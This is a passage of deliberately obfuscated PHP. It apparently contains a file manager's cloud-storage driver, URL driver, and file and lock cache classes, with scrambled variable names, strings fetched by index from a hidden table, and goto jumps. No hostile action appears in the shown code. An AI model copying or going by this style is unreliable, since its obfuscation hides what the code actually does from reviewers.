$_SERVER[º·Ï‹¥³]; return $á®®°¤ä[$îãÉ¾¨[33]] == $îãÉ¾¨[78]; }); $§äÈü­ë = count($€Šç§ÜÄ); $’¦šİ«˜ = count($’¦šİ«˜); $„Ê”Ö»í = $§äÈü­ë - $’¦šİ«˜; if ($ÕñÒåÈø) { $¿¤ÚÌÙ§ += $’¦šİ«˜; $î¢öù  += $„Ê”Ö»í; if ($§äÈü­ë < $ØÊş…ÀÌ) { break; } continue; } if ($¡ÌÁÖëÛ) { if ($„Ê”Ö»í) { return !0; } } else { if ($’¦šİ«˜) { return !0; } } if ($§äÈü­ë < $ØÊş…ÀÌ) { break; } } if ($ÕñÒåÈø) { return array($ëáÍ¸—[230] => $î¢öù , $ëáÍ¸—[231] => $¿¤ÚÌÙ§); } return !1; } public function listAll($ñö´Ğ÷Ò) { $ş·¦˜ =& $_SERVER[º·Ï‹¥³]; $”Ô–ªÏ = $ÍıÔÅû = array(); $this->fileList($ñö´Ğ÷Ò, $”Ô–ªÏ, $ÍıÔÅû, !0); $È·Ş€ÈÉ = array_to_keyvalue($ÍıÔÅû, $ş·¦˜[32]); foreach ($”Ô–ªÏ as $ïÙ´³­) { if (is_string($ïÙ´³­)) { $È·Ş€ÈÉ[$ïÙ´³­] = array($ş·¦˜[79] => 0); } } return $this->listAllFiles($ñö´Ğ÷Ò, $È·Ş€ÈÉ); } public function canRead($é¤¤·«) { return $this->exist($é¤¤·«) ? !0 : !1; } public function canWrite($“û¯ŞëÂ) { return $this->exist($“û¯ŞëÂ) ? !0 : !1; } public function getContent($¦”ûáÏº) { return $this->fileSubstr($¦”ûáÏº, 0, -1); } public function setContent($¼ÏŠïÅ§, $åÁì‹Øş = '') { $ùÖï±¯ =& $_SERVER[º·Ï‹¥³]; if (!$åÁì‹Øş) { $İõË“³« = $this->ussRequest($¼ÏŠïÅ§, $ùÖï±¯[248]); return $İõË“³«[$ùÖï±¯[1265]]; } $±¾¹åÂƒ = $this->tempFile($this->pathThis($¼ÏŠïÅ§)); file_put_contents($±¾¹åÂƒ, $åÁì‹Øş); if ($this->upload($¼ÏŠïÅ§, $±¾¹åÂƒ)) { $this->tempFileRemve($±¾¹åÂƒ); return !0; } return !1; } public function fileSubstr($¸ÆÕ×Ô¬, $É™ûè¹«, $ŠôÕˆøü) { $•¨ûûô =& $_SERVER[º·Ï‹¥³]; if (!($–ŸöíÓ = $this->link($¸ÆÕ×Ô¬))) { return !1; } $øğ™í¸Í = !1; if ($ŠôÕˆøü > 0) { $Ë¨¬óÀí = $É™ûè¹« + $ŠôÕˆøü - 1; $øğ™í¸Í = array($•¨ûûô[1508] . $É™ûè¹« . $•¨ûûô[446] . $Ë¨¬óÀí); } $ÖÄšß…Å = url_request($–ŸöíÓ, $•¨ûûô[252], !1, $øğ™í¸Í); return $ÖÄšß…Å[$•¨ûûô[802]] ? $ÖÄšß…Å[$•¨ûûô[1255]] : !1; } public function upload($İ¤â È¬, $ù€úˆÑ, $ËÁ¶¿‡õ = false, $ìšË—¼“ = REPEAT_REPLACE) { $ìËœçÊ¤ =& $_SERVER[º·Ï‹¥³]; $×È¾…Æø = IO::size($ù€úˆÑ); if ($×È¾…Æø <= 1024 * 1024 * 200) { $”¹’Â…ı = array($ìËœçÊ¤[1561] . $ù€úˆÑ); $â³òÇä™ = $this->ussRequest($İ¤â È¬, $ìËœçÊ¤[250], $”¹’Â…ı); return $â³òÇä™[$ìËœçÊ¤[1265]] ? $this->getPathOuter($İ¤â È¬) : !1; } $½á–Ú¨é = 1024 * 1024 * 10; $èè«˜ÈÁ = array($ìËœçÊ¤[1562], $ìËœçÊ¤[1563] . $×È¾…Æø, $ìËœçÊ¤[1564], $ìËœçÊ¤[1565] . $½á–Ú¨é); $â³òÇä™ = $this->ussRequest($İ¤â È¬, $ìËœçÊ¤[250], !1, $èè«˜ÈÁ); if (!$â³òÇä™[$ìËœçÊ¤[1265]]) { return !1; } $ä­ÇÓ® = $â³òÇä™[$ìËœçÊ¤[1255]]; $´•à‘ÕŒ = 0; $Æ¨à“ = $ä­ÇÓ®[$ìËœçÊ¤[1566]]; $Œ„Ì÷ÈÀ = fopen($ù€úˆÑ, $ìËœçÊ¤[1427]); if (!$Œ„Ì÷ÈÀ) { return !1; } do { $Ô¼†Œì¢ = $ä­ÇÓ®[$ìËœçÊ¤[1567]]; fseek_64($Œ„Ì÷ÈÀ, $´•à‘ÕŒ); $“„ÕÜªë = fread($Œ„Ì÷ÈÀ, $Ô¼†Œì¢); $Ş€€©„ = 0; do { $Ş€€©„++; $ä­ÇÓ® = $this->uploadPart($İ¤â È¬, $ä­ÇÓ®, $“„ÕÜªë); } while (!$ä­ÇÓ® && $Ş€€©„ < 3); if (!$ä­ÇÓ®) { return !1; } $Æ¨à“ = $ä­ÇÓ®[$ìËœçÊ¤[1566]]; $´•à‘ÕŒ += $Ô¼†Œì¢; } while ($Æ¨à“ != -1); fclose($Œ„Ì÷ÈÀ); $èè«˜ÈÁ = array($ìËœçÊ¤[1568], $ìËœçÊ¤[1569] . $ä­ÇÓ®[$ìËœçÊ¤[1570]], $ìËœçÊ¤[1564]); $â³òÇä™ = $this->ussRequest($İ¤â È¬, $ìËœçÊ¤[250], !1, $èè«˜ÈÁ); return $â³òÇä™[$ìËœçÊ¤[1265]] ? $this->getPathOuter($¾ÑÇ‡ç²) : !1; } private function uploadPart($Ô­êÒ÷, $š›àÅ†, &$ØÙ Ã™µ) { $ìÕçªÃø =& $_SERVER[º·Ï‹¥³]; $›àöš« = array($ìÕçªÃø[1571], $ìÕçªÃø[1569] . $š›àÅ†[$ìÕçªÃø[1570]], $ìÕçªÃø[1572] . $š›àÅ†[$ìÕçªÃø[1566]], $ìÕçªÃø[146] . $š›àÅ†[$ìÕçªÃø[1567]]); $Š¶ˆĞ·ê = $this->ussRequest($Ô­êÒ÷, $ìÕçªÃø[250], $ØÙ Ã™µ, $›àöš«); return !$Š¶ˆĞ·ê[$ìÕçªÃø[1265]] ? $Š¶ˆĞ·ê[$ìÕçªÃø[1265]] : $Š¶ˆĞ·ê[$ìÕçªÃø[1255]]; } public function uploadFormData($óô¶û“, $¨ÀµêÄ‚ = 3600) { return $this->uploadPolicy($óô¶û“, $¨ÀµêÄ‚); } public function multiUploadFormData($®æÁíœ×, $Ş”³Ü˜™ = 3600) { $®˜ƒŞ€˜ =& $_SERVER[º·Ï‹¥³]; $Ú‘îÍÌ = (int) $GLOBALS[$®˜ƒŞ€˜[7]][$®˜ƒŞ€˜[79]]; return $this->uploadPolicy($®æÁíœ×, $Ş”³Ü˜™, $Ú‘îÍÌ); } private function uploadPolicy($¼¶ôøÓµ, $Ö«¨È›§ = 3600, $Ú«­¥Æ = 0) { $ÔÇß¤–± =& $_SERVER[º·Ï‹¥³]; $¶›ÂœóÜ = $ÔÇß¤–±[8] . $this->bucket; $ôË˜ûáÈ = gmdate($ÔÇß¤–±[1466]); $ÕÑùÀÃ¶ = array($ÔÇß¤–±[1573] => $this->bucket, $ÔÇß¤–±[1574] => $¼¶ôøÓµ, $ÔÇß¤–±[1575] => time() + $Ö«¨È›§, $ÔÇß¤–±[1576] => $ôË˜ûáÈ); if ($Ú«­¥Æ) { $ÕÑùÀÃ¶[$ÔÇß¤–±[1447]] = $Ú«­¥Æ; } $ı¯µüµÒ = base64_encode(json_encode($ÕÑùÀÃ¶)); $èôĞß³ = base64_encode(hash_hmac($ÔÇß¤–±[1530], "\x50\117\x53\x54\x26{$¶›ÂœóÜ}\x26{$ôË˜ûáÈ}\x26{$ı¯µüµÒ}", md5("{$this->userpass}"), !0)); $‰é¥” = array($ÔÇß¤–±[284] => $ı¯µüµÒ, $ÔÇß¤–±[1577] => "\x55\120\131\125\116\40{$this->username}\x3a{$èôĞß³}", $ÔÇß¤–±[199] => $this->endpoint . $¶›ÂœóÜ); return $‰é¥”; } public function download($‡ÎÉ°ñÀ, $ªÂß§—) { $œ¹ˆ®è = IO::getPathInner(IO::mkfile($ªÂß§—)); if (!($ƒªÌÎ§ = $this->link($‡ÎÉ°ñÀ))) { return !1; } $¦³Óí¬ = 0; $‘ÛüÖ¦ = 1024 * 200; $şÀĞÆÂ = fopen($œ¹ˆ®è, $_SERVER[º·Ï‹¥³][1514]); while (!0) { $ªåìÑ° = $this->fileSubstr($‡ÎÉ°ñÀ, $¦³Óí¬, $‘ÛüÖ¦); if ($ªåìÑ° === !1) { return !1; } fwrite($şÀĞÆÂ, $ªåìÑ°); $¦³Óí¬ += $‘ÛüÖ¦; if (strlen($ªåìÑ°) < $‘ÛüÖ¦) { break; } } fclose($şÀĞÆÂ); return $ªÂß§—; } public function link($­½òÆ­‚, $óüÃ˜â = array()) { $£÷öæ“ğ =& $_SERVER[º·Ï‹¥³]; $­½òÆ­‚ = trim($­½òÆ­‚, $£÷öæ“ğ[8]); if (!empty($this->token)) { $Ê­ğÍ = strtotime(date($£÷öæ“ğ[1578])); $ëŞÙ»¨ = substr(md5($this->token . $£÷öæ“ğ[335] . $Ê­ğÍ . $£÷öæ“ğ[1579] . $­½òÆ­‚), 12, 8) . $Ê­ğÍ; $óüÃ˜â[] = $£÷öæ“ğ[1580] . $ëŞÙ»¨; } $Å•İâä£ = !empty($óüÃ˜â) ? $£÷öæ“ğ[76] . implode($£÷öæ“ğ[335], $óüÃ˜â) : $£÷öæ“ğ[12]; return $this->getHost() . $£÷öæ“ğ[8] . $­½òÆ­‚ . $Å•İâä£; } public function fileOut($öÜ¬Ä³, $ŠÈŞ¶ã¿ = false, $îû¸¢Â = false, $¡ª¤û½ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($öÜ¬Ä³, $ŠÈŞ¶ã¿, $îû¸¢Â, $¡ª¤û½); } if (!$îû¸¢Â) { $îû¸¢Â = $this->pathThis($öÜ¬Ä³); } $™Òûê’ = $ŠÈŞ¶ã¿ ? array($_SERVER[º·Ï‹¥³][1581] . rawurlencode($îû¸¢Â)) : array(); $×şõ¨äû = $this->link($öÜ¬Ä³, $™Òûê’); $this->fileOutLink($×şõ¨äû); } public function fileOutServer($Î•é“, $‹ öõôø = false, $•š€ä×ª = false, $™ş™µÌ = '') { parent::fileOut($Î•é“, $‹ öõôø, $•š€ä×ª, $™ş™µÌ); } public function fileOutImage($Ê˜»—âÑ, $½ø¾“Œ = 250) { $€Ğ¾¿û = $this->link($Ê˜»—âÑ . $_SERVER[º·Ï‹¥³][1582] . $½ø¾“Œ); $this->fileOutLink($€Ğ¾¿û); } public function fileOutImageServer($ŠÃïÖ’, $‰…ƒ¥ÓÙ = 250) { parent::fileOutImage($ŠÃïÖ’, $‰…ƒ¥ÓÙ); } public function hashMd5($é°‚¿Æ) { $®ışÕŞ³ =& $_SERVER[º·Ï‹¥³]; $‹¬ÈøÔú = $this->_objectMeta($é°‚¿Æ); return isset($‹¬ÈøÔú[$®ışÕŞ³[236]]) ? $‹¬ÈøÔú[$®ışÕŞ³[236]] : !1; } public function size($½Öã«ß) { $É­Í´¨º = $this->objectMeta($½Öã«ß); return $É­Í´¨º ? $É­Í´¨º[$_SERVER[º·Ï‹¥³][79]] : 0; } public function info($éÉÅÃÍË) { if ($this->isFolder($éÉÅÃÍË)) { return $this->folderInfo($éÉÅÃÍË); } else { if ($this->isFile($éÉÅÃÍË)) { return $this->fileInfo($éÉÅÃÍË); } } return !1; } public function exist($ØŒ”Î) { return $this->isFile($ØŒ”Î) || $this->isFolder($ØŒ”Î); } public function isFile($èª€­‡ª) { return !$this->isFolder($èª€­‡ª) && $this->objectMeta($èª€­‡ª); } public function isFolder($ÑÑÅÇ¯ç) { return $this->cacheMethod($_SERVER[º·Ï‹¥³][169], $ÑÑÅÇ¯ç); } protected function objectMeta($ò‹ô™Á¾) { return $this->cacheMethod($_SERVER[º·Ï‹¥³][171], $ò‹ô™Á¾); } protected function _objectMeta($š¥Ş÷Ò) { $¶şÁ¨Üà =& $_SERVER[º·Ï‹¥³]; if ($š¥Ş÷Ò == $¶şÁ¨Üà[12] || $š¥Ş÷Ò == $¶şÁ¨Üà[8]) { return array(); } $é‚®ÅÌÕ = $this->ussRequest($š¥Ş÷Ò, $¶şÁ¨Üà[1583]); if (!$é‚®ÅÌÕ[$¶şÁ¨Üà[1265]]) { return null; } $ˆƒĞ‡Ö = isset($é‚®ÅÌÕ[$¶şÁ¨Üà[1255]]) ? $é‚®ÅÌÕ[$¶şÁ¨Üà[1255]] : array(); if (!isset($ˆƒĞ‡Ö[$¶şÁ¨Üà[1584]])) { return null; } $éÚµî = array($¶şÁ¨Üà[33] => isset($ˆƒĞ‡Ö[$¶şÁ¨Üà[1584]]) ? $ˆƒĞ‡Ö[$¶şÁ¨Üà[1584]] : null, $¶şÁ¨Üà[79] => isset($ˆƒĞ‡Ö[$¶şÁ¨Üà[1585]]) ? $ˆƒĞ‡Ö[$¶şÁ¨Üà[1585]] : null, $¶şÁ¨Üà[236] => isset($ˆƒĞ‡Ö[$¶şÁ¨Üà[1586]]) ? $ˆƒĞ‡Ö[$¶şÁ¨Üà[1586]] : null, $¶şÁ¨Üà[1553] => isset($ˆƒĞ‡Ö[$¶şÁ¨Üà[1587]]) ? $ˆƒĞ‡Ö[$¶şÁ¨Üà[1587]] : null); $éÚµî[$¶şÁ¨Üà[1554]] = isset($ˆƒĞ‡Ö[$¶şÁ¨Üà[1588]]) ? strtotime($ˆƒĞ‡Ö[$¶şÁ¨Üà[1588]]) : $éÚµî[$¶şÁ¨Üà[1553]]; return $éÚµî; } protected function _isFolder($»®â¿âë) { $İÕ¶Ò²Ï =& $_SERVER[º·Ï‹¥³]; if ($»®â¿âë == $İÕ¶Ò²Ï[12] || $»®â¿âë == $İÕ¶Ò²Ï[8]) { return !0; } $Ÿ·¬üŠ„ = $this->_objectMeta($»®â¿âë); return isset($Ÿ·¬üŠ„[$İÕ¶Ò²Ï[33]]) && $Ÿ·¬üŠ„[$İÕ¶Ò²Ï[33]] == $İÕ¶Ò²Ï[78] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($ÍÒÍİç© = false) { } public function exist($óŠÂúÊ) { $À²Š¿—º = $this->info($óŠÂúÊ); return $À²Š¿—º[$_SERVER[º·Ï‹¥³][223]]; } public function isFile($öıĞåÏ±) { $Ï‚®Ÿ¾š = $this->info($öıĞåÏ±); return $Ï‚®Ÿ¾š[$_SERVER[º·Ï‹¥³][223]]; } public function isFolder($½€´ß®ê) { return !1; } public function size($ã±·Ù‰­) { $Ãº”ôÂš = $this->info($ã±·Ù‰­); return $Ãº”ôÂš[$_SERVER[º·Ï‹¥³][79]]; } public function info($³”–ëİ) { return $this->infoParse($³”–ëİ); } public function infoAuth($¨è¨ó¿«) { return $this->infoParse($¨è¨ó¿«); } public function infoWithChildren($íÍ¹—ı¡) { return $this->infoParse($íÍ¹—ı¡); } public function infoFull($°­İÛ–©) { return $this->infoParse($°­İÛ–©); } private function infoParse($‚ÁÄãı) { $¬¨ÁÕ¹¸ =& $_SERVER[º·Ï‹¥³]; $‚±½Ö× = $this->header($‚ÁÄãı); if (!$‚±½Ö× || !$‚±½Ö×[$¬¨ÁÕ¹¸[802]]) { return !1; } $Á–™ä‰² = _get($‚±½Ö×, $¬¨ÁÕ¹¸[388], 0); $­„®äá = array($¬¨ÁÕ¹¸[32] => $‚±½Ö×[$¬¨ÁÕ¹¸[32]], $¬¨ÁÕ¹¸[87] => $‚ÁÄãı, $¬¨ÁÕ¹¸[33] => $¬¨ÁÕ¹¸[221], $¬¨ÁÕ¹¸[79] => intval($Á–™ä‰²), $¬¨ÁÕ¹¸[178] => get_path_ext($‚±½Ö×[$¬¨ÁÕ¹¸[32]]), $¬¨ÁÕ¹¸[1424] => $Á–™ä‰² > 0 && $‚±½Ö×[$¬¨ÁÕ¹¸[1589]], $¬¨ÁÕ¹¸[1425] => !1); return $­„®äá; } private function header($ıŠÆÚĞ¤) { $İòãı½Ã =& $_SERVER[º·Ï‹¥³]; if (isset(self::$_cacheHeader[$ıŠÆÚĞ¤])) { return self::$_cacheHeader[$ıŠÆÚĞ¤]; } $ÆóœÌÄ¼ = isset($GLOBALS[$İòãı½Ã[1590]]) ? $GLOBALS[$İòãı½Ã[1590]] : !1; $GLOBALS[$İòãı½Ã[1590]] = !0; self::$_cacheHeader[$ıŠÆÚĞ¤] = url_header($ıŠÆÚĞ¤); $GLOBALS[$İòãı½Ã[1590]] = $ÆóœÌÄ¼; return self::$_cacheHeader[$ıŠÆÚĞ¤]; } public function hashSimple($Ë•ìÆ‰«, $¤ûØ×Ã» = false) { $èã£ˆ°à =& $_SERVER[º·Ï‹¥³]; $ÎŒÓÔ£¸ = $this->info($Ë•ìÆ‰«); if (!$ÎŒÓÔ£¸ || !$ÎŒÓÔ£¸[$èã£ˆ°à[223]]) { return !1; } $ºÃôÒÆ = $ÎŒÓÔ£¸[$èã£ˆ°à[79]]; $¢€»ŞÕ¬ = 200; $§­¥á¨÷ = 50; if ($ºÃôÒÆ <= $¢€»ŞÕ¬ * $§­¥á¨÷) { return md5($this->fileSubstr($Ë•ìÆ‰«, 0, $ºÃôÒÆ)) . $ºÃôÒÆ; } $¦ŠïÂúÁ = intval($ºÃôÒÆ / $§­¥á¨÷); $ÓøÜÜîÆ = $èã£ˆ°à[12]; $†¦èşÒÖ = timeFloat(); $Å—ŒËÊÆ = 15; for ($«¢¤–Ôƒ = 0; $«¢¤–Ôƒ < $§­¥á¨÷; $«¢¤–Ôƒ++) { if (timeFloat() - $†¦èşÒÖ > $Å—ŒËÊÆ) { return !1; } $ô˜î©ä€ = $this->fileSubstr($Ë•ìÆ‰«, $¦ŠïÂúÁ * $«¢¤–Ôƒ, $¢€»ŞÕ¬); if (!$ô˜î©ä€) { return !1; } $ÓøÜÜîÆ .= $ô˜î©ä€; } $ÓøÜÜîÆ .= $this->fileSubstr($Ë•ìÆ‰«, $ºÃôÒÆ - $¢€»ŞÕ¬, $¢€»ŞÕ¬); return md5($ÓøÜÜîÆ) . $ºÃôÒÆ; } public function getContent($ÉáÍß‹­) { return $this->fileSubstr($ÉáÍß‹­); } public function fileSubstr($ØË¥‚ïš, $¬×¾ø¨Ù = 0, $Õò„îœ³ = -1) { $ÀóÕÙÇ  =& $_SERVER[º·Ï‹¥³]; $ËšãÒó = $this->info($ØË¥‚ïš); if (!$ËšãÒó || !$ËšãÒó[$ÀóÕÙÇ [223]] && $ËšãÒó[$ÀóÕÙÇ [79]] > 1024 * 1024 * 10) { return !1; } if ($Õò„îœ³ === -1) { $Õò„îœ³ = $ËšãÒó[$ÀóÕÙÇ [79]]; } if ($Õò„îœ³ == 0) { return $ÀóÕÙÇ [12]; } $‘‘ı¯öÔ = array($ÀóÕÙÇ [1591] . $¬×¾ø¨Ù . $ÀóÕÙÇ [836] . ($¬×¾ø¨Ù + $Õò„îœ³ - 1)); $ËÅ¬ÒÊû = url_request($ØË¥‚ïš, $ÀóÕÙÇ [252], !1, $‘‘ı¯öÔ, !1, !1, 30); return $ËÅ¬ÒÊû[$ÀóÕÙÇ [1255]] ? $ËÅ¬ÒÊû[$ÀóÕÙÇ [1255]] : $ÀóÕÙÇ [12]; } public function download($¢Ÿ‡Ø´, $áˆÅŒÕ) { Downloader::start($¢Ÿ‡Ø´, $áˆÅŒÕ); return $áˆÅŒÕ; } } goto Cˆ×Ûê†›²; aÛ¨ ¼‰Ÿù: class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($ŒÃçá¨Ê, $±ÑÈ°Å) { $„©‘Úîš =& $_SERVER[º·Ï‹¥³]; $this->cachePath = $ŒÃçá¨Ê[$„©‘Úîš[87]]; $this->prefix = $„©‘Úîš[886]; $this->cacheTime = $±ÑÈ°Å; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($ùõÊê¬ú) { $³İ±„¬– =& $_SERVER[º·Ï‹¥³]; $ùõÊê¬ú = str_replace(array($³İ±„¬–[887], $³İ±„¬–[100], $³İ±„¬–[76]), $³İ±„¬–[888], $ùõÊê¬ú); return $this->cachePath . $³İ±„¬–[889] . $ùõÊê¬ú . $³İ±„¬–[890]; } public function set($—ï•Ù£å, $±¢ÆÙû, $±¥¥‡Á• = false) { $±¥¥‡Á• = $±¥¥‡Á• ? $±¥¥‡Á• : $this->cacheTime; $°‰´ª¿ = $this->getFile($—ï•Ù£å); if (file_put_contents($°‰´ª¿, $this->prefix . $±¢ÆÙû, LOCK_EX)) { @touch($°‰´ª¿, intval(time() + $±¥¥‡Á•)); clearstatcache(); return !0; } @unlink($°‰´ª¿); return !1; } public function get($³´Şó¢) { $ñÔê²ï = $this->getFile($³´Şó¢); if (file_exists($ñÔê²ï) && filemtime($ñÔê²ï) < time()) { @unlink($ñÔê²ï); return !1; } $Æ‚¯Å¤¦ = @file_get_contents($ñÔê²ï); return substr($Æ‚¯Å¤¦, strlen($this->prefix)); } public function remove($Ø»ÊÖÉ) { $ÍÛå¬ÃÊ = $this->getFile($Ø»ÊÖÉ); return @unlink($ÍÛå¬ÃÊ); } public function deleteAll() { $îñ¼¡ıù =& $_SERVER[º·Ï‹¥³]; $Ì•Ü›Ô = scandir($this->cachePath); foreach ($Ì•Ü›Ô as $Îí·Õ) { $”´´Œ›¨ = $this->cachePath . $Îí·Õ; if (strpos($”´´Œ›¨, $îñ¼¡ıù[890]) && strpos($”´´Œ›¨, $îñ¼¡ıù[891])) { @unlink($”´´Œ›¨); } } } public function clearTimeout() { $ÀŠé€êÓ =& $_SERVER[º·Ï‹¥³]; $ÓÑşÌ€Ú = scandir($this->cachePath); foreach ($ÓÑşÌ€Ú as $¬Œ»ÙÅİ) { $øõÊò³Ñ = $this->cachePath . $¬Œ»ÙÅİ; if (strpos($øõÊò³Ñ, $ÀŠé€êÓ[890]) && strpos($øõÊò³Ñ, $ÀŠé€êÓ[891]) && filemtime($øõÊò³Ñ) < time()) { @unlink($øõÊò³Ñ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $Şææµö± =& $_SERVER[º·Ï‹¥³]; if (self::$handle) { return self::$handle; } $’Ú­Â¼® = $GLOBALS[$Şææµö±[6]][$Şææµö±[400]]; self::$timeout = $’Ú­Â¼®[$Şææµö±[892]] ? $’Ú­Â¼®[$Şææµö±[892]] : 10; $÷ò¹Ó¬á = _get($GLOBALS[$Şææµö±[6]], $Şææµö±[893]); $ô«Ûíú™ = $’Ú­Â¼®[$Şææµö±[878]] ? $’Ú­Â¼®[$Şææµö±[878]] : $Şææµö±[221]; if ($ô«Ûíú™ == $Şææµö±[21] && $÷ò¹Ó¬á == $Şææµö±[13]) { $ô«Ûíú™ = $Şææµö±[221]; } switch ($ô«Ûíú™) { case $Şææµö±[881]: self::$handle = new CacheLockRedis(); break; case $Şææµö±[882]: self::$handle = new CacheLockMemcached(); break; case $Şææµö±[21]: self::$handle = new CacheLockDatabase(); break; case $Şææµö±[221]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($Şææµö±[894], $Şææµö±[895]); } return self::$handle; } private static function key($²˜¯ÆÈÍ) { return $_SERVER[º·Ï‹¥³][896] . Cache::key($²˜¯ÆÈÍ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($æÇÁ£×ª = '') { self::$errorMsg = $æÇÁ£×ª; } public static function lockGlobal($Ø­Õƒ‚Ú, $ßÃ‹«ö•) { return self::lock($Ø­Õƒ‚Ú, $ßÃ‹«ö•, !0); } public static function lock($£÷…·ÖŒ, $éßß…Á  = false, $•¯ÄûĞ = false) { $Íû¾Œ”Š =& $_SERVER[º·Ï‹¥³]; $Ä´¡Õ×‚ = self::init(); $Õé“‰Õ = self::key($£÷…·ÖŒ); $éßß…Á  = $éßß…Á  ? $éßß…Á  : self::$timeout; $á‡Ã·˜· = timeFloat(); $ˆ ôÙ£´ = $Ä´¡Õ×‚->lock($Õé“‰Õ, $éßß…Á ); $ËÃâú³ = timeFloat(); if (!$ˆ ôÙ£´) { $£Å¢µ¦ = "\154\x6f\x63\153\40\x65\x72\x72\157\162\73\153\x65\171\75{$£÷…·ÖŒ}\x3b\x74\151\x6d\x65\x3d{$éßß…Á }\x3b" . self::$errorMsg . $Íû¾Œ”Š[74] . get_caller_msg(); $Ü¸„ó¶½ = LNG($Íû¾Œ”Š[897]) . "\50{$éßß…Á }\163\51\56" . LNG($Íû¾Œ”Š[898]); $Ü¸„ó¶½ .= $Íû¾Œ”Š[899]; if (is_string(self::$errorMsg) && self::$errorMsg) { $Ü¸„ó¶½ = $Ü¸„ó¶½ . $Íû¾Œ”Š[900] . self::$errorMsg; } write_log($Íû¾Œ”Š[901] . sprintf($Íû¾Œ”Š[902], timeFloat() - $á‡Ã·˜·) . $Íû¾Œ”Š[903] . $£Å¢µ¦ . $Íû¾Œ”Š[904] . error_get_last(), $Íû¾Œ”Š[895]); show_json($Ü¸„ó¶½, !1); } if (!$•¯ÄûĞ) { self::$lockItem[$Õé“‰Õ] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $Ÿ’ù‘¢ = number_format(timeFloat() - $ËÃâú³, 3); write_log($Íû¾Œ”Š[905] . $£÷…·ÖŒ . $Íû¾Œ”Š[906] . $Ÿ’ù‘¢, $Íû¾Œ”Š[895]); } return $ˆ ôÙ£´; } public static function lockGet($ßãËóÇ) { $ı®¡ñÏ = self::key($ßãËóÇ); if (self::$lockItem[$ı®¡ñÏ]) { return self::$lockItem[$ı®¡ñÏ]; } return self::init()->lockGet($ı®¡ñÏ); } public static function unlock($Š‘‡ğÌ¿) { $™£“¶ó¡ =& $_SERVER[º·Ï‹¥³]; $ëãöúß• = self::key($Š‘‡ğÌ¿); self::$lockItem[$ëãöúß•] = null; self::init()->unlock($ëãöúß•); if (GLOBAL_DEBUG_LOG_ALL) { write_log($™£“¶ó¡[907] . $Š‘‡ğÌ¿, $™£“¶ó¡[895]); } return; } public static function unlockRuntime() { $ŒùìæÖØ =& $_SERVER[º·Ï‹¥³]; $ş“ÓìÉ© = self::init(); $¶ùı¾× = !1; foreach (self::$lockItem as $ÃØ÷à½ú => $ÌŠš†ÀÊ) { if (!$ÌŠš†ÀÊ) { continue; } $ş“ÓìÉ©->unlock($ÃØ÷à½ú); if (!$¶ùı¾×) { $¶ùı¾× = !0; write_log($ŒùìæÖØ[908] . $ÃØ÷à½ú . $ŒùìæÖØ[74] . get_caller_msg(), $ŒùìæÖØ[895]); continue; } write_log($ŒùìæÖØ[908] . $ÃØ÷à½ú, $ŒùìæÖØ[895]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $ÓÉº²•“ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($ŒùìæÖØ[909] . $ÓÉº²•“ . $ŒùìæÖØ[910] . ACTION, $ŒùìæÖØ[895]); } } public static function fileLock($¶÷¿íò) { $è„£ÈÄÕ =& $_SERVER[º·Ï‹¥³]; if (!$GLOBALS[$è„£ÈÄÕ[911]]) { $GLOBALS[$è„£ÈÄÕ[911]] = array(); } $GLOBALS[$è„£ÈÄÕ[911]][$¶÷¿íò] = !1; $â³ßÑ©š = fopen(DATA_PATH . $¶÷¿íò . $è„£ÈÄÕ[912], $è„£ÈÄÕ[913]); if (!$â³ßÑ©š) { return !1; } $GLOBALS[$è„£ÈÄÕ[911]][$¶÷¿íò] = $â³ßÑ©š; if (flock($â³ßÑ©š, LOCK_EX)) { return !0; } self::unlock($¶÷¿íò); show_json($è„£ÈÄÕ[914], !1); return !1; } public static function fileUnlock($æÅñ˜÷·) { $íƒœ«² =& $_SERVER[º·Ï‹¥³]; $„Ñí‡‹– = $GLOBALS[$íƒœ«²[911]][$æÅñ˜÷·]; if (!$„Ñí‡‹–) { return; } $GLOBALS[$íƒœ«²[911]][$æÅñ˜÷·] = !1; flock($„Ñí‡‹–, LOCK_UN); fclose($„Ñí‡‹–); } public static function fileUnlockAll() { $Îˆ“²À =& $_SERVER[º·Ï‹¥³]; if (!$GLOBALS[$Îˆ“²À[911]]) { return; } foreach ($GLOBALS[$Îˆ“²À[911]] as $ÓŒŞ™µ¥ => $€ÌÓ‹›°) { if (!$€ÌÓ‹›°) { continue; } $GLOBALS[$Îˆ“²À[911]][$ÓŒŞ™µ¥] = !1; flock($€ÌÓ‹›°, LOCK_UN); fclose($€ÌÓ‹›°); } $GLOBALS[$Îˆ“²À[911]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto fÙ‡·§îÁ; a¹ã™ˆğåó: class CacheLockDatabase { public function lock($îÌòÄéü, $´á·Î®Ó = 0) { $û€ÍˆÖø = Model($_SERVER[º·Ï‹¥³][880]); $•™ç‚¤ = microtime(!0) + $´á·Î®Ó; while (microtime(!0) < $•™ç‚¤) { $¹ÈïÚ— = $û€ÍˆÖø->get($îÌòÄéü); if (!$¹ÈïÚ— || $¹ÈïÚ— < microtime(!0)) { $ŠîÇÅ§Å = $û€ÍˆÖø->set($îÌòÄéü, $•™ç‚¤); if ($ŠîÇÅ§Å) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($û¡­ƒÂ®) { return Model($_SERVER[º·Ï‹¥³][880])->get($û¡­ƒÂ®); } public function unlock($­ÇÂÆ´î) { Model($_SERVER[º·Ï‹¥³][880])->remove($­ÇÂÆ´î); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($ºçú¬ö, $‰ÆÑê”Â) { $Êü“®’ =& $_SERVER[º·Ï‹¥³]; if (!class_exists($Êü“®’[918])) { show_json($Êü“®’[919], !1); } $this->cacheTime = $‰ÆÑê”Â; $this->handle = new Memcached(); if (is_array($ºçú¬ö[$Êü“®’[920]]) && count($ºçú¬ö[$Êü“®’[920]]) >= 